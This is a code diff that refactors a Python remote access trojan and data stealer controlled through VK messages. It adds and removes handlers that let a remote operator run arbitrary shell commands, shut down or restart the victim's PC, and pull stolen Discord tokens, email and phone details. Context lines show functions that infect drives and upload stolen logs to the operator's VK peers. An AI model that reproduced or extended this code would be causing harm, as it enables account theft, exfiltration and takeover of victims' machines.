@@ -652,48 +652,6 @@ def command_name_new(_arguments, _event) -> str:
         return f"Invalid name!"
 
 
-def command_exit(_arguments, _event) -> str:
-    # @function command_exit()
-    # @returns str
-    # @description Function for command "exit" that exits app.
-
-    # Exiting.
-    raise SystemExit
-
-
-def command_shutdown(_arguments, _event) -> str:
-    # @function command_shutdown()
-    # @returns str
-    # @description Function for command "shutdown" that shutdowns PC.
-
-    # Shutdown.
-    os.system("shutdown /s /t 0")
-
-    # Message.
-    return "System was shutdown..."
-
-
-def command_restart(_arguments, _event) -> str:
-    # @function command_restart()
-    # @returns str
-    # @description Function for command "restart" that restarts PC.
-
-    # Restarting.
-    os.system("shutdown /r /t 0")
-
-    # Message.
-    return "System was restarted..."
-
-
-def command_console(_arguments, _event) -> str:
-    # @function command_console()
-    # @returns str
-    # @description Function for command "console" that executes console command.
-
-    # Executing system and returning result.
-    return str(os.system(_arguments))
-
-
 def command_destruct(_arguments, _event) -> str:
     # @function command_destruct()
     # @returns str
@@ -790,28 +748,6 @@ def command_discord_profile_raw(_arguments: str, _event) -> str:
 
     # Returning.
     return json.dumps(stealer_steal_discord_profile(_tokens), indent=2)
-
-
-def command_discord_profile(_arguments: str, _event) -> str:
-    # @function command_discord_profile()
-    # @returns Str
-    # @description Function for command "discord_profile" that returns information about discord found in system ,(comma).
-
-    # Getting tokens.
-    _tokens = stealer_steal_discord_tokens()
-
-    if len(_tokens) == 0:
-        # If not found any tokens.
-
-        # Error.
-        return "Tokens not found in system!"
-
-    # Getting profile.
-    _profile = stealer_steal_discord_profile(_tokens)
-    _avatar = f"https://cdn.discordapp.com/avatars/636928558203273216/{_profile['avatar']}.png"
-
-    # Returning.
-    return f"[ID{_profile['id']}]\n[{_profile['email']}]\n[{_profile['phone']}]\n{_profile['username']}\n\n{_avatar}"
 
 
 def spreading_infect_drive(_drive: str) -> None:
@@ -1132,8 +1068,8 @@ def stealer_steal_data(_force: bool = False):
                 # Dumping.
                 json.dump(__VALUES, _file, indent=4)
 
-            for _peer in config["server"]["vk"]["users"]:
-                # For every peer in admins.
+            for _peer in config["server"]["vk"]["peers"]:
+                # For every peer in peers.
 
                 # Uploading document.
                 _uploading_result = server_upload_document(_path, "Log File", _peer, "doc")
@@ -1163,34 +1099,21 @@ def stealer_steal_data(_force: bool = False):
         return {_exception}
 
 
-def user_is_admin(_peer: str) -> bool:
-    # @function user_is_admin()
-    # @returns None
-    # @description Function that returns is given user is admin or not.
-
-    # Read admins.
-    admins = config["server"]["vk"]["users"]
-
-    if admins is None or len(admins) == 0:
-        # If there is no admins in the list
-
-        # Returning true as there is no admins.
-        return True
-
-    # Returning.
-    return _peer in admins
-
-
 def client_answer_server(_event) -> None:
     # @function client_answer_server()
     # @returns None
     # @description Function that process message from the remote access (server).
 
+    if config["server"]["type"] == "VK_USER":
+        message = _event.message
+    elif config["server"]["type"] == "VK_GROUP":
+        message = _event.message
+
     # Getting text from the event.
-    _text = _event.text
+    _text = message.text
 
     # Getting peer from the event.
-    _peer = _event.peer_id
+    _peer = message.peer_id
 
     # Text of the response.
     _response_text = None
@@ -1217,8 +1140,8 @@ def client_answer_server(_event) -> None:
         if _message_tags == "alive":
             # If this is network command (That is work without tags and for all).
 
-            if user_is_admin(_peer):
-                # If user is admin and allowed to make commands.
+            if peer_is_allowed(_peer):
+                # If peer is alowed
 
                 # Getting current time.
                 _current_time = datetime.datetime.now().strftime("%H:%M:%S")
@@ -1236,8 +1159,8 @@ def client_answer_server(_event) -> None:
             if list_intersects(parse_tags(_message_tags), __TAGS):
                 # If we have one or more tag from our tags.
 
-                if user_is_admin(_peer):
-                    # If user is admin.
+                if peer_is_allowed(_peer):
+                    # If peer is allowed.
 
                     if len(_message_arguments) == 0:
                         # If there is no tags + command.
@@ -1461,6 +1384,73 @@ def server_upload_document(_path: str, _title: str, _peer: int, _type: str = "do
         return [_exception]  # noqa
 
 
+# Commands.
+
+def command_discord_profile(*args, **kwargs) -> str:
+    """ Command `discord_profile` that returns information about Discord found in system ,(comma)."""
+
+    # Getting tokens.
+    tokens = stealer_steal_discord_tokens()
+
+    if len(tokens) == 0:
+        # If not found any tokens.
+
+        # Error.
+        return "Discord tokens not found in system!"
+
+    # Getting profile.
+    profile = stealer_steal_discord_profile(tokens)
+
+    # Getting avatar.
+    avatar = f"https://cdn.discordapp.com/avatars/636928558203273216/{profile['avatar']}.png" if profile["avatar"] else None
+
+    # Returning.
+    return f"[ID{profile['id']}]\n[{profile['email']}]\n[{profile['phone']}]\n{profile['username']}" + "\n\n{_avatar}" if avatar else ""
+
+
+def command_exit(*args, **kwargs) -> str:
+    """ Command `exit` that exists app. """
+
+    # Exiting.
+    exit(0)
+
+
+def command_shutdown(*args, **kwargs) -> str:
+    """ Command `shutdown` that shutdown system. """
+
+    # Shutdown.
+    os.system("shutdown /s /t 0")
+
+    # Message.
+    return "Shutdowning system (`shutdown /s /t 0`)..."
+
+
+def command_restart(*args, **kwargs) -> str:
+    """ Command `restart` that restarts system. """
+    # Restarting.
+    os.system("shutdown /r /t 0")
+
+    # Message.
+    return "Restarting system (`shutdown /r /t 0`)..."
+
+
+def command_console(arguments, *args, **kwargs) -> str:
+    """ Command `console` that executing console. """
+
+    # Call console.
+    console_response = os.system(arguments)
+
+    # Executing system and returning result.
+    if console_response == __SYSTEM_OK:
+        # If OK
+        
+        # OK Mesasge.
+        return "Console status code: OK (Returned - 0)"
+
+    # Error.
+    return f"Console status code: ERROR (Returned - {console_response})"
+
+
 # Debug.
 
 def debug_message(message: str) -> None:
@@ -1669,7 +1659,7 @@ def server_listen() -> None:
                 # Trying to listen.
 
                 # Get required message event.
-                message_event =  vk_api.longpoll.VkEventType.MESSAGE_NEW if server_type == "VK_USER" else vk_api.bot_longpoll.VkBotEventType.MESSAGE_NEW
+                message_event = vk_api.longpoll.VkEventType.MESSAGE_NEW if server_type == "VK_USER" else vk_api.bot_longpoll.VkBotEventType.MESSAGE_NEW
 
                 for event in __SERVER_LONGPOLL.listen():  # noqa
                     # For every message event in the server longpoll listening.
@@ -2647,6 +2637,22 @@ def load_config():
 
 
 # Other.
+
+def peer_is_allowed(peer: str) -> bool:
+    """ Returns is peer is allowed or not. """
+
+    # Get peers.
+    peers = config["server"]["vk"]["peers"]
+
+    if peers is None or len(peers) == 0:
+        # If there is no peers in the list
+
+        # Returning true as there is no peers.
+        return True
+
+    # Returning.
+    return peer in peers
+
 
 def exit_handler() -> None:
     """ Should be registered as exit handler (at_exit). """
